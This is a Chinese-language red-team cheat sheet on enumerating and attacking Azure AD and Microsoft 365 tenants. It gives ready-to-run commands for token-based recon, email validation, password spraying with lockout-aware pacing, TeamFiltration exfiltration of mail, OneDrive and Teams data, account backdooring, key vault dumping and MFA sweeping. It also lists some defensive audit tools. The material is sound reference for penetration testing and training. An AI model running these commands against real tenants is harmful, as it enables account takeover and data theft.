# Azure AD - 枚举 (Enumerate)

## Azure AD - 收集器 (Collectors)

* [**Microsoft Portals**](https://msportals.io/) - 微软管理站点 (Microsoft Administrator Sites)
* [**dirkjanm/ROADTool**](https://github.com/dirkjanm/ROADtools) - 一系列用于攻防安全目的的 Azure AD 工具集合

    ```ps1
    roadrecon auth --access-token eyJ0eXA...
    roadrecon auth --prt-cookie <primary-refresh-token> -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2"
    roadrecon gather
    roadrecon gui
    ```

* [**BloodHoundAD/AzureHound**](https://github.com/BloodHoundAD/AzureHound) - BloodHound 的 Azure 数据导出工具

    ```ps1
    ./azurehound --refresh-token <refresh-token> list --tenant "<target-tenant-id>" -o output.json
    ./azurehound -u "<username>@contoso.onmicrosoft.com" -p "<password>" list groups --tenant "<tenant>.onmicrosoft.com"
    ./azurehound -j "<jwt>" list users --tenant "<tenant>.onmicrosoft.com"
    ```

* [**BloodHoundAD/BARK**](https://github.com/BloodHoundAD/BARK) - BloodHound 攻击研究工具包 (Attack Research Kit)

    ```ps1
    . .\BARK.ps1
    $MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword -username "user@contoso.onmicrosoft.com" -password "MyVeryCoolPassword" -TenantID "contoso.onmicrosoft.com"
    $MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID "contoso.onmicrosoft.com"
    $MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress
    ```

* [**dafthack/GraphRunner**](https://github.com/dafthack/GraphRunner) - 用于与 Microsoft Graph API 交互的后渗透工具集

    ```ps1
    Invoke-GraphRecon -Tokens $tokens -PermissionEnum
    Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
    Invoke-DumpApps -Tokens $tokens
    Get-DynamicGroups -Tokens $tokens
    ```

* [**NetSPI/MicroBurst**](https://github.com/NetSPI/MicroBurst) - MicroBurst 包含支持 Azure 服务发现、弱配置审计以及凭据转储等后渗透操作的函数和脚本

    ```powershell
    PS C:> Import-Module .\MicroBurst.psm1
    PS C:> Import-Module .\Get-AzureDomainInfo.ps1
    PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose
    ```

* [**hausec/PowerZure**](https://github.com/hausec/PowerZure) - 用于评估 Azure 安全性的 PowerShell 框架

    ```powershell
    Import-Module .\Powerzure.psd1
    Set-Subscription -Id [idgoeshere]
    Get-AzureTarget
    Get-AzureInTuneScript
    Show-AzureKeyVaultContent -All
    ```

* [**silverhack/monkey365**](https://github.com/silverhack/monkey365) - Microsoft 365、Azure 订阅和 Microsoft Entra ID 安全配置审查工具。

    ```powershell
    Get-ChildItem -Recurse c:\monkey365 | Unblock-File
    Import-Module C:\temp\monkey365
    Get-Help Invoke-Monkey365
    Get-Help Invoke-Monkey365 -Examples
    Get-Help Invoke-Monkey365 -Detailed
    ```

* [**prowler-cloud/prowler**](https://github.com/prowler-cloud/prowler) - Prowler 是一款针对 AWS、Azure、GCP 和 Kubernetes 的开源安全工具，用于进行安全评估、审计、事件响应、合规性检查、持续监控、加固和取证准备。包含 CIS, NIST 800, NIST CSF, CISA, FedRAMP, PCI-DSS, GDPR, HIPAA, FFIEC, SOC2, GXP, Well-Architected Security, ENS 等标准。
* [**projectdiscovery/nuclei-templates**](https://github.com/projectdiscovery/nuclei-templates/tree/main/cloud/azure) - 由社区维护的 nuclei 引擎模板列表，用于发现安全漏洞。

    ```ps1
    nuclei -t ~/nuclei-templates/cloud/azure/ -code -v
    ```

* [**nccgroup/ScoutSuite**](https://github.com/nccgroup/ScoutSuite) - 多云安全审计工具 (Multi-Cloud Security Auditing Tool)
* [**Flangvik/TeamFiltration**](https://github.com/Flangvik/TeamFiltration) - TeamFiltration 是一个跨平台框架，用于枚举、喷洒、脱库以及为 O365 AAD 帐户设置后门

    ```ps1
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --cookie-dump C:\\CookieData.txt --all
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --aad 
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --tokens C:\\OutputTokens.txt --onedrive --owa
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --backdoor
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --database
    ```

* [**Azure/StormSpotter**](https://github.com/Azure/Stormspotter) - :warning: 此存储库近期未更新 - 用于绘制 Azure 和 Azure Active Directory 对象图形的 Azure 红队工具
* [**nccgroup/Azucar**](https://github.com/nccgroup/azucar.git) - :warning: 此存储库已归档 - Azucar 自动收集各种配置数据并分析与特定订阅相关的所有数据，以确定安全风险。
* [**FSecureLABS/Azurite**](https://github.com/FSecureLABS/Azurite) - :warning: 此存储库近期未更新 - Microsoft Azure 云中的枚举和侦察活动。
* [**cyberark/SkyArk**](https://github.com/cyberark/SkyArk) - :warning: 此存储库近期未更新 - 发现扫描的 Azure 环境中权限最高的账户——包括 Azure 影子管理员 (Azure Shadow Admins)。

## Azure AD - 用户枚举 (User Enumeration)

### 枚举租户信息 (Enumerate Tenant Informations)

* 与 Azure AD 或 O365 的联合身份验证 (Federation)

    ```powershell
    Get-AADIntLoginInformation -UserName <USER>@<TENANT NAME>.onmicrosoft.com
    https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
    ```

* 获取租户 ID (Tenant ID)

    ```powershell
    Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com
    https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
    https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration
    ```

### 从访客账户枚举 (Enumerate from a Guest Account)

```ps1
powerpwn recon --tenant {tenantId} --cache-path {path}
powerpwn dump -tenant {tenantId} --cache-path {path}
powerpwn gui --cache-path {path}
```

### 枚举电子邮件 (Enumerate Emails)

> 默认情况下，O365 的锁定策略为 10 次尝试，并将账户锁定一 (1) 分钟。

* 验证电子邮件 (Validate email)

    ```powershell
    PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
    admin@<TENANT NAME>.onmicrosoft.com   - VALID
    root@<TENANT NAME>.onmicrosoft.com    - INVALID
    test@<TENANT NAME>.onmicrosoft.com    - VALID
    contact@<TENANT NAME>.onmicrosoft.com - INVALID
    ```

* 使用有效凭据提取电子邮件列表：[nyxgeek/o365recon](https://github.com/nyxgeek/o365recon)

    ```powershell
    Install-Module MSOnline
    Install-Module AzureAD
    .\o365recon.ps1 -azure
    ```

### 密码喷洒 (Password Spraying)

默认锁定策略允许 10 次失败尝试，然后锁定账户 60 秒。

* [dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)

    ```powershell
    PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
    PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
    PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
    PS> Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
    ```

* [0xZDH/o365spray](https://github.com/0xZDH/o365spray)

    ```powershell
    o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
    ```

* [Flangvik/TeamFiltration](https://github.com/Flangvik/TeamFiltration)

    ```powershell
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push --shuffle-users --shuffle-regions
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\2021\FooBar\Exclude_Emails.txt
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
    ```

## Azure 服务枚举 (Azure Services Enumeration)

### 枚举租户域名 (Enumerate Tenant Domains)

提取给定租户的公开可用信息：[aadinternals.com/osint](https://aadinternals.com/osint/)

```ps1
Invoke-AADIntReconAsOutsider -DomainName <DOMAIN>
Invoke-AADIntReconAsOutsider -Domain "company.com" | Format-Table
Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
```

### 枚举 Azure 子域名 (Enumerate Azure Subdomains)

```powershell
PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
子域名 (Subdomain)             服务 (Service)
---------                     -------
<TENANT NAME>.mail.protection.outlook.com Email
<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
```

### 枚举服务 (Enumerate Services)

* 使用 Az Powershell 模块

    ```powershell
    # 枚举资源
    PS Az> Get-AzResource

    # 列出用户有权访问的所有虚拟机 (VM)
    PS Az> Get-AzVM 

    # 获取所有 Web 应用 (Webapps)
    PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

    # 获取所有函数应用 (Function apps)
    PS Az> Get-AzFunctionApp

    # 列出所有存储账户 (Storage accounts)
    PS Az> Get-AzStorageAccount

    # 列出所有密钥保管库 (Keyvaults)
    PS Az> Get-AzKeyVault

    # 获取当前租户注册的所有应用程序对象
    PS AzureAD> Get-AzureADApplication -All $true

    # 枚举角色分配 (Role assignments)
    PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>
    PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com

    # 检查 AppID 的备用名称 / 显示名称
    PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<APP-ID>"} | fl
    ```

* 使用 az cli

    ```powershell
    PS> az vm list
    PS> az vm list --query "[].[name]" -o table
    PS> az webapp list
    PS> az functionapp list --query "[].[name]" -o table
    PS> az storage account list
    PS> az keyvault list
    ```

## 多因素身份验证 (Multi Factor Authentication / MFA)

* [dafthack/MFASweep](https://github.com/dafthack/MFASweep) - 用于检查多个微软服务上是否启用了 MFA 的工具

```ps1
Import-Module .\MFASweep.ps1
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS
```

## 参考资料 (References)

* [Bypassing conditional access by faking device compliance - @DrAzureAD - September 06, 2020](https://o365blog.com/post/mdm/)
* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)
* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps - Ryan Hausknecht - Jan 28, 2020](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
* [Azure Config Review - Nuclei Templates v10.0.0 - Prince Chaddha - Sep 12, 2024](https://blog.projectdiscovery.io/azure-config-review-with-nuclei/)
